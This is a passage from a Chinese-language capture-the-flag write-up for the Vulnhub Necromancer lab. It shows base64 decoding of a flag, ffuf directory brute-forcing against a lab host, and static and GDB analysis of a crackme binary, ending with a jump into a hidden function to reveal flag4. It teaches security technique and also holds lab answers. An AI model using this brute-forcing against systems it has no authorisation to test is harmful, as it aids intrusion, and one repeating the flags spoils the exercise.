+</span></span><span class=line><span class=cl>└─$ cat _pileoffeathers.jpg.extracted/feathers.txt
+</span></span><span class=line><span class=cl><span class=nv>ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ</span><span class=o>==</span>                 
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>flag3<span class=o>{</span>9ad3f62db7b91c28b68137000394639f<span class=o>}</span> - Cross the chasm at /amagicbridgeappearsatthechasm 
+</span></span></code></pre></td></tr></table></div></div><p>读取又发现一个符合base64特征的字符，解码获得一个flag3，并且提供了一个新的目录</p><h2 id=获取flag4>获取flag4</h2><h3 id=访问新路径>访问新路径</h3><p>又是一段话并且附带一个照片</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>You cautiously make your way across chasm.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The cave before you is protected by some sort of spell cast by the necromancer.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Hastily you take a few steps back away from the cave entrance.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>There must be a magical item that could protect you from the necromancer&#39;s spell
+</span></span></code></pre></td></tr></table></div></div><h3 id=对新目录进行目录爆破>对新目录进行目录爆破</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.102/amagicbridgeappearsatthechasm/FUZZ
+</span></span></code></pre></td></tr></table></div></div><p>得到这个talisman，翻译是护身符，符合当前境界</p><h3 id=得到一个可执行文件>得到一个可执行文件</h3><p>访问这个新路径提示要下载这个护身符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ file talisman 
+</span></span><span class=line><span class=cl>talisman: ELF 32-bit LSB executable, Intel i386, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class=k>for</span> GNU/Linux 2.6.32, BuildID<span class=o>[</span>sha1<span class=o>]=</span>2b131df906087adf163f8cba1967b3d2766e639d, not stripped
+</span></span></code></pre></td></tr></table></div></div><p>一个未剥离符号32位的ELF可执行程序,假如要逆向，函数名都保留着，这对逆向分析极其有利</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ strings talisman 
+</span></span><span class=line><span class=cl>/lib/ld-linux.so.2
+</span></span><span class=line><span class=cl>libc.so.6
+</span></span><span class=line><span class=cl>_IO_stdin_used
+</span></span><span class=line><span class=cl>__isoc99_scanf
+</span></span><span class=line><span class=cl><span class=nb>printf</span>
+</span></span><span class=line><span class=cl>__libc_start_main
+</span></span><span class=line><span class=cl>__gmon_start__
+</span></span><span class=line><span class=cl>GLIBC_2.7
+</span></span><span class=line><span class=cl>GLIBC_2.0
+</span></span><span class=line><span class=cl>PTRh
+</span></span><span class=line><span class=cl>UWVS
+</span></span><span class=line><span class=cl>t$,U
+</span></span><span class=line><span class=cl><span class=o>[</span>^_<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=p>;</span>*2$<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>GCC: (Debian 5.3.1-21) 5.3.1 20160528
+</span></span></span><span class=line><span class=cl><span class=s2>crtstuff.c
+</span></span></span><span class=line><span class=cl><span class=s2>__JCR_LIST__
+</span></span></span><span class=line><span class=cl><span class=s2>deregister_tm_clones
+</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux
+</span></span></span><span class=line><span class=cl><span class=s2>completed.6597
+</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux_fini_array_entry
+</span></span></span><span class=line><span class=cl><span class=s2>frame_dummy
+</span></span></span><span class=line><span class=cl><span class=s2>__frame_dummy_init_array_entry
+</span></span></span><span class=line><span class=cl><span class=s2>talisman.c
+</span></span></span><span class=line><span class=cl><span class=s2>__FRAME_END__
+</span></span></span><span class=line><span class=cl><span class=s2>__JCR_END__
+</span></span></span><span class=line><span class=cl><span class=s2>__init_array_end
+</span></span></span><span class=line><span class=cl><span class=s2>_DYNAMIC
+</span></span></span><span class=line><span class=cl><span class=s2>__init_array_start
+</span></span></span><span class=line><span class=cl><span class=s2>__GNU_EH_FRAME_HDR
+</span></span></span><span class=line><span class=cl><span class=s2>_GLOBAL_OFFSET_TABLE_
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_fini
+</span></span></span><span class=line><span class=cl><span class=s2>_ITM_deregisterTMCloneTable
+</span></span></span><span class=line><span class=cl><span class=s2>__x86.get_pc_thunk.bx
+</span></span></span><span class=line><span class=cl><span class=s2>printf@@GLIBC_2.0
+</span></span></span><span class=line><span class=cl><span class=s2>_edata
+</span></span></span><span class=line><span class=cl><span class=s2>chantToBreakSpell
+</span></span></span><span class=line><span class=cl><span class=s2>unhide
+</span></span></span><span class=line><span class=cl><span class=s2>myPrintf
+</span></span></span><span class=line><span class=cl><span class=s2>__data_start
+</span></span></span><span class=line><span class=cl><span class=s2>wearTalisman
+</span></span></span><span class=line><span class=cl><span class=s2>__gmon_start__
+</span></span></span><span class=line><span class=cl><span class=s2>__dso_handle
+</span></span></span><span class=line><span class=cl><span class=s2>_IO_stdin_used
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_start_main@@GLIBC_2.0
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_init
+</span></span></span><span class=line><span class=cl><span class=s2>_fp_hw
+</span></span></span><span class=line><span class=cl><span class=s2>__bss_start
+</span></span></span><span class=line><span class=cl><span class=s2>main
+</span></span></span><span class=line><span class=cl><span class=s2>_Jv_RegisterClasses
+</span></span></span><span class=line><span class=cl><span class=s2>__isoc99_scanf@@GLIBC_2.7
+</span></span></span><span class=line><span class=cl><span class=s2>__TMC_END__
+</span></span></span><span class=line><span class=cl><span class=s2>_ITM_registerTMCloneTable
+</span></span></span><span class=line><span class=cl><span class=s2>.symtab
+</span></span></span><span class=line><span class=cl><span class=s2>.strtab
+</span></span></span><span class=line><span class=cl><span class=s2>.shstrtab
+</span></span></span><span class=line><span class=cl><span class=s2>.interp
+</span></span></span><span class=line><span class=cl><span class=s2>.note.ABI-tag
+</span></span></span><span class=line><span class=cl><span class=s2>.note.gnu.build-id
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.hash
+</span></span></span><span class=line><span class=cl><span class=s2>.dynsym
+</span></span></span><span class=line><span class=cl><span class=s2>.dynstr
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version_r
+</span></span></span><span class=line><span class=cl><span class=s2>.rel.dyn
+</span></span></span><span class=line><span class=cl><span class=s2>.rel.plt
+</span></span></span><span class=line><span class=cl><span class=s2>.init
+</span></span></span><span class=line><span class=cl><span class=s2>.plt.got
+</span></span></span><span class=line><span class=cl><span class=s2>.text
+</span></span></span><span class=line><span class=cl><span class=s2>.fini
+</span></span></span><span class=line><span class=cl><span class=s2>.rodata
+</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame_hdr
+</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame
+</span></span></span><span class=line><span class=cl><span class=s2>.init_array
+</span></span></span><span class=line><span class=cl><span class=s2>.fini_array
+</span></span></span><span class=line><span class=cl><span class=s2>.jcr
+</span></span></span><span class=line><span class=cl><span class=s2>.dynamic
+</span></span></span><span class=line><span class=cl><span class=s2>.got.plt
+</span></span></span><span class=line><span class=cl><span class=s2>.data
+</span></span></span><span class=line><span class=cl><span class=s2>.bss
+</span></span></span><span class=line><span class=cl><span class=s2>.comment
+</span></span></span></code></pre></td></tr></table></div></div><p>已经能看到几个关键函数名</p><p>main：主函数
+wearTalisman：穿戴护身符
+chantToBreakSpell：吟唱破咒
+unhide：揭示/解蔽
+myPrintf：自定义输出</p><p>这明显是一个交互式程序：你需要“穿戴护身符”并“吟唱”正确内容来打破死灵法师的咒语，从而获得 flag4 或下一步线索。</p><p>我们先动态看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ chmod +x talisman <span class=o>&amp;&amp;</span> ./talisman
+</span></span><span class=line><span class=cl>You have found a talisman.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The talisman is cold to the touch, and has no words or symbols on it<span class=err>&#39;</span>s surface.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Do you want to wear the talisman?  yes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nothing happens.
+</span></span></code></pre></td></tr></table></div></div><p>反汇编看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>objdump -d -M intel talisman <span class=p>|</span> sed -n <span class=s1>&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><p>-d：反汇编代码段。</p></li><li><p>-M intel：使用 Intel 语法（更易读）。</p></li><li><p>|：管道。</p></li><li><p><code>sed -n '/&lt;main>:/,/^$/p'</code>：只打印 main 函数从开始到下一个空行之间的内容，避免输出过长。</p></li></ul><p>main 函数非常简单，只调用了 wearTalisman，再反汇编这几个函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>objdump -d -M intel talisman <span class=p>|</span> sed -n <span class=s1>&#39;/&lt;wearTalisman&gt;:/,/^$/p&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>objdump -d -M intel talisman <span class=p>|</span> sed -n <span class=s1>&#39;/&lt;myPrintf&gt;:/,/^$/p&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ objdump -d -M intel talisman <span class=p>|</span> sed -n <span class=s1>&#39;/&lt;myPrintf&gt;:/,/^$/p&#39;</span>
+</span></span><span class=line><span class=cl>080484f4 &lt;myPrintf&gt;:
+</span></span><span class=line><span class=cl> 80484f4:       <span class=m>55</span>                      push   ebp
+</span></span><span class=line><span class=cl> 80484f5:       <span class=m>89</span> e5                   mov    ebp,esp
+</span></span><span class=line><span class=cl> 80484f7:       <span class=m>83</span> ec <span class=m>08</span>                sub    esp,0x8
+</span></span><span class=line><span class=cl> 80484fa:       ff <span class=m>75</span> <span class=m>08</span>                push   DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>
+</span></span><span class=line><span class=cl> 80484fd:       e8 <span class=m>49</span> ff ff ff          call   804844b &lt;unhide&gt;
+</span></span><span class=line><span class=cl> 8048502:       <span class=m>83</span> c4 <span class=m>04</span>                add    esp,0x4
+</span></span><span class=line><span class=cl> 8048505:       <span class=m>83</span> ec <span class=m>08</span>                sub    esp,0x8
+</span></span><span class=line><span class=cl> 8048508:       ff <span class=m>75</span> <span class=m>08</span>                push   DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>
+</span></span><span class=line><span class=cl> 804850b:       <span class=m>68</span> b0 <span class=m>95</span> <span class=m>04</span> <span class=m>08</span>          push   0x80495b0
+</span></span><span class=line><span class=cl> 8048510:       e8 fb fd ff ff          call   <span class=m>8048310</span> &lt;printf@plt&gt;
+</span></span><span class=line><span class=cl> 8048515:       <span class=m>83</span> c4 <span class=m>10</span>                add    esp,0x10
+</span></span><span class=line><span class=cl> 8048518:       <span class=m>83</span> ec 0c                sub    esp,0xc
+</span></span><span class=line><span class=cl> 804851b:       ff <span class=m>75</span> <span class=m>08</span>                push   DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>
+</span></span><span class=line><span class=cl> 804851e:       e8 7a ff ff ff          call   804849d &lt;hide&gt;
+</span></span><span class=line><span class=cl> 8048523:       <span class=m>83</span> c4 <span class=m>10</span>                add    esp,0x10
+</span></span><span class=line><span class=cl> 8048526:       <span class=m>90</span>                      nop
+</span></span><span class=line><span class=cl> 8048527:       c9                      leave
+</span></span><span class=line><span class=cl> 8048528:       c3                      ret
+</span></span></code></pre></td></tr></table></div></div><p>注意到myPrintf 的逻辑很清晰：先调用 unhide 解密缓冲区，用 printf 打印，再调用 hide 重新加密回去。所以真正的解密算法在 unhide 里，hide 应该是它的逆操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>objdump -d -M intel talisman <span class=p>|</span> sed -n <span class=s1>&#39;/&lt;unhide&gt;:/,/^$/p; /&lt;hide&gt;:/,/^$/p&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><p>unhide 的解密逻辑是：对字符串逐字节异或一个 4 字节循环密钥 [0xb5, 0xf2, 0x3c, 0xa1]，直到解密后的字节为 0 停止。</p></li><li><p>wearTalisman 里硬编码了多段加密字符串，分别位于缓冲区偏移 0、0x64、0xc8、0x12c 处。我们需要把这些字节提取出来，然后分别解密。</p></li></ul><p>不过用 GDB 动态调试是最直观的方式能直接看到解密后的字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>gdb ./talisman
+</span></span></code></pre></td></tr></table></div></div><p>从反汇编里看到，myPrintf 在 0x8048510 处调用 printf@plt。在这个地址下断点，就能在每次打印前看到已解密的字符串</p><p>在 GDB 提示符下输入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>break</span> *0x8048510
+</span></span></code></pre></td></tr></table></div></div><p>然后输入run</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span> Legend: Modified register <span class=p>|</span> Code <span class=p>|</span> Heap <span class=p>|</span> Stack <span class=p>|</span> String <span class=o>]</span>
+</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+</span></span><span class=line><span class=cl><span class=nv>$eax</span>   : 0x0       
+</span></span><span class=line><span class=cl><span class=nv>$ebx</span>   : 0xf7f94e34  →  0x00232d2c <span class=o>(</span><span class=s2>&#34;,-#&#34;</span>?<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$ecx</span>   : 0x0       
+</span></span><span class=line><span class=cl><span class=nv>$edx</span>   : 0xa13cf200
+</span></span><span class=line><span class=cl><span class=nv>$esp</span>   : 0xffffcc70  →  0x080495b0  →  0x00007325 <span class=o>(</span><span class=s2>&#34;%s&#34;</span>?<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$ebp</span>   : 0xffffcc88  →  0xffffce58  →  0xffffce68  →  0x08049530  →  &lt;__libc_csu_init+0000&gt; push ebp
+</span></span><span class=line><span class=cl><span class=nv>$esi</span>   : 0xf7f94e34  →  0x00232d2c <span class=o>(</span><span class=s2>&#34;,-#&#34;</span>?<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$edi</span>   : 0xffffce3c  →  0xffffdfcb  →  <span class=s2>&#34;/home/kali/Labs/Vulnhub/Necromancer/talisman&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$eip</span>   : 0x08048510  →  0xfffdfbe8  →  0x00000000
+</span></span><span class=line><span class=cl><span class=nv>$eflags</span>: <span class=o>[</span>zero carry PARITY ADJUST SIGN <span class=nb>trap</span> INTERRUPT direction overflow resume virtualx86 identification<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=nv>$cs</span>: 0x23 <span class=nv>$ss</span>: 0x2b <span class=nv>$ds</span>: 0x2b <span class=nv>$es</span>: 0x2b <span class=nv>$fs</span>: 0x00 <span class=nv>$gs</span>: 0x63 
+</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+</span></span><span class=line><span class=cl>0xffffcc70│+0x0000: 0x080495b0  →  0x00007325 <span class=o>(</span><span class=s2>&#34;%s&#34;</span>?<span class=o>)</span>    ← <span class=nv>$esp</span>
+</span></span><span class=line><span class=cl>0xffffcc74│+0x0004: 0xffffccac  →  <span class=s2>&#34;You have found a talisman.\n\n&#34;</span>
+</span></span><span class=line><span class=cl>0xffffcc78│+0x0008: 0x08048502  →  &lt;myPrintf+000e&gt; add esp, 0x4
+</span></span><span class=line><span class=cl>0xffffcc7c│+0x000c: 0xffffccc8  →  0x00000000
+</span></span><span class=line><span class=cl>0xffffcc80│+0x0010: 0x00000000
+</span></span><span class=line><span class=cl>0xffffcc84│+0x0014: 0x00000000
+</span></span><span class=line><span class=cl>0xffffcc88│+0x0018: 0xffffce58  →  0xffffce68  →  0x08049530  →  &lt;__libc_csu_init+0000&gt; push ebp         ← <span class=nv>$ebp</span>
+</span></span><span class=line><span class=cl>0xffffcc8c│+0x001c: 0x080489b3  →  &lt;wearTalisman+048a&gt; add esp, 0x10
+</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+</span></span><span class=line><span class=cl>    0x8048505 &lt;myPrintf+0011&gt;  sub    esp, 0x8
+</span></span><span class=line><span class=cl>    0x8048508 &lt;myPrintf+0014&gt;  push   DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>
+</span></span><span class=line><span class=cl>    0x804850b &lt;myPrintf+0017&gt;  push   0x80495b0
+</span></span><span class=line><span class=cl>●→  0x8048510 &lt;myPrintf+001c&gt;  call   0x8048310 &lt;printf@plt&gt;
+</span></span><span class=line><span class=cl>   ↳   0x8048310 &lt;printf@plt+0000&gt; jmp    DWORD PTR ds:0x804a880
+</span></span><span class=line><span class=cl>       0x8048316 &lt;printf@plt+0006&gt; push   0x0
+</span></span><span class=line><span class=cl>       0x804831b &lt;printf@plt+000b&gt; jmp    0x8048300
+</span></span><span class=line><span class=cl>       0x8048320 &lt;__libc_start_main@plt+0000&gt; jmp    DWORD PTR ds:0x804a884
+</span></span><span class=line><span class=cl>       0x8048326 &lt;__libc_start_main@plt+0006&gt; push   0x8
+</span></span><span class=line><span class=cl>       0x804832b &lt;__libc_start_main@plt+000b&gt; jmp    0x8048300
+</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments <span class=o>(</span>guessed<span class=o>)</span> ────
+</span></span><span class=line><span class=cl>printf@plt <span class=o>(</span>
+</span></span><span class=line><span class=cl>   <span class=o>[</span>sp + 0x0<span class=o>]</span> <span class=o>=</span> 0x080495b0 → 0x00007325 <span class=o>(</span><span class=s2>&#34;%s&#34;</span>?<span class=o>)</span>,
+</span></span><span class=line><span class=cl>   <span class=o>[</span>sp + 0x4<span class=o>]</span> <span class=o>=</span> 0xffffccac → <span class=s2>&#34;You have found a talisman.\n\n&#34;</span>,
+</span></span><span class=line><span class=cl>   <span class=o>[</span>sp + 0x8<span class=o>]</span> <span class=o>=</span> 0x08048502 → &lt;myPrintf+000e&gt; add esp, 0x4,
+</span></span><span class=line><span class=cl>   <span class=o>[</span>sp + 0xc<span class=o>]</span> <span class=o>=</span> 0xffffccc8 → 0x00000000
+</span></span><span class=line><span class=cl><span class=o>)</span>
+</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#0] Id 1, Name: &#34;talisman&#34;, stopped 0x8048510 in myPrintf (), reason: BREAKPOINT</span>
+</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#0] 0x8048510 → myPrintf()</span>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#1] 0x80489b3 → wearTalisman()</span>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>#2] 0x8048a29 → main()</span>
+</span></span><span class=line><span class=cl>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class=line><span class=cl>gef➤ 
+</span></span></code></pre></td></tr></table></div></div><p>已经在第一个断点停住了，栈上能看到第一段解密后的字符串 &ldquo;You have found a talisman.\n\n&rdquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=k>continue</span>
+</span></span></code></pre></td></tr></table></div></div><p>重复3次continue</p><p>未发现什么内容，输入 quit 退出</p><p>说明输入不参与任何判断，纯剧情烟雾弹</p><p>而 chantToBreakSpell() 位于 0x8048a37，全程序没有任何 call 指向它——隐藏死函数，</p><p>真 flag 就藏在里面（典型的函数没被引用，得手动调用套路）。</p><p>再调试一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>gdb ./talisman
+</span></span><span class=line><span class=cl><span class=nb>break</span> wearTalisman 
+</span></span><span class=line><span class=cl>run
+</span></span><span class=line><span class=cl>jump chantToBreakSpell
+</span></span></code></pre></td></tr></table></div></div><p>jump 会修改当前执行位置，使程序从指定地址继续执行。这里由于 chantToBreakSpell() 本身没有被调用，但函数已经存在于 ELF 中，因此可以直接跳转到该函数执行。</p><p>获取到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
